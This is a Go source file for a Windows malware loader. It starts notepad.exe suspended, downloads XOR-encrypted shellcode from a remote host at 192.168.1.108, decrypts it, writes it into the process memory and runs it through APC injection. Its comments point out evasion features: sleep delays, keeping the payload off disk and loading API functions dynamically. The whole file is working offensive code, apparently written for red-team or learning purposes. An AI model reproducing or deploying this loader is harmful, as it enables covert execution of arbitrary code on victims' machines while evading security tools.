package main

import (
	"fmt"
	"encoding/hex"
	"io"
	"log"
	"net/http"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// XOR key - same as used in encryption (170 or 0xAA)
const xorKey byte = 170
// Variable to hold encrypted shellcode (will be downloaded)
var encryptedHex string

func main() {
	//sleep for 10 seconds
	fmt.Println("Going to sleep...")
	sleepNow()

	fmt.Println("Finally...waking up now!")

	//Step 1: Create notepad.exe in suspended state
	fmt.Println("[+] Creating notepad.exe in suspended state")
	pi := createSuspendedProcess()
	fmt.Printf("[+] Created Suspended process with PID: %d\n", pi.ProcessId)
	fmt.Printf("[+] Main thread ID: %d\n", pi.ThreadId)


	//Download shellcode from remote server
	//Common technique to avoid malicious payload on disk
	encryptedPayload, err := wget("http://192.168.1.108:9000/encrypted_shellcode.txt")
	if err != nil {
		log.Fatalf("[-] Unable to connect to the host: %v", err)
	}

	//Convert downloaded bytes to string
	encryptedHex=string(encryptedPayload)
	fmt.Printf("[+] Downloaded encryped Shellcode(%d bytes)\n", len(encryptedHex))

	//Time to decrypt the payload
	sc, err:=decryptShellcode()
	if err != nil{
		log.Fatalf("[!] Failed to decrypt shellcode: %v", err)
	}

	fmt.Printf("[+] Successfully decrypted shellcode (%d bytes)\n", len(sc))

	fmt.Println("Going to Sleep Again...")
	sleepNow()
	
	//Step 2: Allocate Memory in the suspended process
	//Load kernel32.dll dynamically to us windows API functions
	modkernel32 := syscall.NewLazyDLL("kernel32.dll")
	procVirtualAllocEx := modkernel32.NewProc("VirtualAllocEx")

	//VirtualAllocEx: Allocate memory in the target process
	//Parameters: Process handle, preferred address, size, allocation type, protection
	addr, _, lastErr := procVirtualAllocEx.Call(
		uintptr(pi.Process), //Handle to target process
		uintptr(0),          //Let system decide where to allocate
		uintptr(len(sc)),    //size of shellcode
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(windows.PAGE_READWRITE)) //Initial memory protection is not executable

	if addr == 0 {
		log.Fatalf("[-] VirtualAlloc Failes: %v\n", lastErr)
	}
	fmt.Printf("[+] Allocated memory address: 0x%x\n", addr)

	//Step 3: Write shellcode into allocated memory
	var numberOfBytesWritten uintptr
	err = windows.WriteProcessMemory(pi.Process, addr, &sc[0], uintptr(len(sc)), &numberOfBytesWritten)
	if err != nil {
		log.Fatalf("[-] Unable to write shellcode: %v", err)
	}
	fmt.Printf("[+] Wrote %d%dbytes to destination address\n", numberOfBytesWritten, len(sc))

	//Stage 4: Change memory protection to executable
	//From PAGE_READWRITE to PAGE_EXECUTE_READ to execute payload
	var oldProtect uint32
	err = windows.VirtualProtectEx(pi.Process, addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)

	if err != nil {
		log.Fatalf("[-] VirtualProtect Failed: %v", err)
	}

	//Step 5: QueueUserAPC (APC Injection)
	fmt.Print("[+] Using APC Injection")
	hijackThreadAndExecute(pi, addr)

	//Step 6: Resume thread
	//APC queue runs our shellcode which has hijacked a thread on the suspended process
	fmt.Println("[+] Resuming the Main thread...")
	resumeThread(pi.Thread)

	//Step 7: Cleanup handles
	windows.CloseHandle(pi.Process)
	windows.CloseHandle(pi.Thread)

	fmt.Println("[+] Injection complete! Shellcode should be executing.")

}

func sleepNow(){
	var t0, t1 time.Time
	fmt.Println("Sleeping for 10 seconds")
	t0 = time.Now()

	for {
		t1 = time.Now()
		diff := t1.Sub(t0)
		if diff.Seconds() > 10 {
			break
		}
	}
}

func decryptShellcode() ([]byte, error) {
    // More efficient hex cleaning - pre-allocate buffer
    cleanedHex := make([]byte, 0, len(encryptedHex))
    for i := 0; i < len(encryptedHex); i++ {
        c := encryptedHex[i]
        if (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F') {
            cleanedHex = append(cleanedHex, c)
        }
    }
    
    // Verify even length
    if len(cleanedHex)%2 != 0 {
        return nil, fmt.Errorf("hex string has odd length: %d", len(cleanedHex))
    }
    
    // Decode hex in one operation instead of character-by-character
    decoded := make([]byte, len(cleanedHex)/2)
    _, err := hex.Decode(decoded, cleanedHex)
    if err != nil {
        return nil, fmt.Errorf("hex decode failed: %v", err)
    }
    
    fmt.Printf("[+] XOR Key: 0x%02x (%d)\n", xorKey, xorKey)
    
    // XOR decrypt using unsafe pointer for better performance
    decrypted := make([]byte, len(decoded))
    for i := 0; i < len(decoded); i++ {
        decrypted[i] = decoded[i] ^ xorKey
    }
    
    // Print first few bytes for verification
    fmt.Print("[+] First 32 bytes (hex): ")
    for i := 0; i < min(32, len(decrypted)); i++ {
        fmt.Printf("%02x ", decrypted[i])
    }
    fmt.Println()
    
    return decrypted, nil
}

// Helper function to get minimum of two integers
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// HTTP download function - fetches shellcode from remote server
// This allows updating payload without modifying the executable
func wget(url string) ([]byte, error) {
	resp, err := http.Get(url)
	if err != nil {
		return []byte{}, err
	}
	defer resp.Body.Close() // Ensure response body is closed

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return []byte{}, err
	}
	return body, nil
}

// Function to create a suspended process
// Returns ProcessInformation containing both process and thread handles
func createSuspendedProcess() windows.ProcessInformation {
	// Dynamically load kernel32.dll to avoid static imports
	modkernel32 := syscall.NewLazyDLL("kernel32.dll")
	procCreateProcess := modkernel32.NewProc("CreateProcessW")

	var si windows.StartupInfo
	var pi windows.ProcessInformation

	// Initialize StartupInfo structure
	si.Cb = uint32(unsafe.Sizeof(si))

	// Convert strings to UTF-16 pointers for Windows API
	appName, _ := syscall.UTF16PtrFromString("C:\\Windows\\System32\\notepad.exe")
	commandLine, _ := syscall.UTF16PtrFromString("") // Empty command line

	// CreateProcessW with CREATE_SUSPENDED flag (0x00000004)
	// Process is created but main thread is suspended, not running yet
	ret, _, err := procCreateProcess.Call(
		uintptr(unsafe.Pointer(appName)),     // Application name
		uintptr(unsafe.Pointer(commandLine)), // Command line
		uintptr(0),                           // Process security attributes (NULL = default)
		uintptr(0),                           // Thread security attributes (NULL = default)
		uintptr(0),                           // Inherit handles (FALSE = don't inherit)
		uintptr(0x00000004),                  // Creation flags: CREATE_SUSPENDED
		uintptr(0),                           // Environment (NULL = use parent's)
		uintptr(0),                           // Current directory (NULL = use parent's)
		uintptr(unsafe.Pointer(&si)),         // Startup info
		uintptr(unsafe.Pointer(&pi)))         // Process info (output)

	if ret == 0 { // Return value of 0 indicates failure
		log.Fatalf("[-] Failed to create suspended process: %v", err)
	}

	return pi // Return process and thread information
}

// APC Injection
func hijackThreadAndExecute(pi windows.ProcessInformation, shellcodeAddr uintptr) {
	modkernel32 := syscall.NewLazyDLL("kernel32.dll")
	procQueueUserAPC := modkernel32.NewProc("QueueUserAPC")

	//QueueUserAC adds an APC to the thread's APC queue
	//Executes when we resume thre
	ret, _, lastErr := procQueueUserAPC.Call(
		shellcodeAddr,      //pointer to APC function --> shellcode address
		uintptr(pi.Thread), //hThrea: Handle to target thread
		0)                  //unused

	if ret == 0 {
		log.Fatalf("[-]QueueUserAPC failed: %v", lastErr)
	}

	fmt.Printf("[+] APC queued successfully for thread: 0x%x\n", pi.Thread)

	//Shellcode will run when process is resumed
}

// Function to resume suspended thread
// Triggers thread to check its APC queue and execute our shellcode
func resumeThread(threadHandle windows.Handle) {
	modkernel32 := syscall.NewLazyDLL("kernel32.dll")
	procResumeThread := modkernel32.NewProc("ResumeThread")

	//ResumeThread decreases threads suspend count by 1
	ret, _, err := procResumeThread.Call(uintptr(threadHandle))
	if ret == uintptr(0xFFFFFFFF) {
		log.Fatalf("[-] Failed to resume thread: %v", err)
	}

	fmt.Printf("[+]Thread resumed successfully(Previous suspend count: %d)\n", ret)
}
